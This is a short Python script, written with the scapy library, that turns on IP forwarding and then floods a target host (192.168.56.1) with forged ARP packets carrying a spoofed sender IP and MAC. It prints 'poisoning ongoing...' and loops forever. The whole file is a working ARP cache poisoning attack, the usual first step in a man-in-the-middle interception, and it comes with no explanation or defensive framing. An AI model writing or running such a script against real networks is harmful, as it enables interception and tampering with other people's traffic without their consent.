from scapy.all import *
import os

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

target = "192.168.56.1"
spoof_ip = "10.13.33.37"
spoof_mac = "de:ad:be:ef:ca:fe"

packet = ARP(op=1, pdst=target, psrc=spoof_ip, hwsrc=spoof_mac)
print("poisoning ongoing...")
while True:
    send(packet, verbose=0)
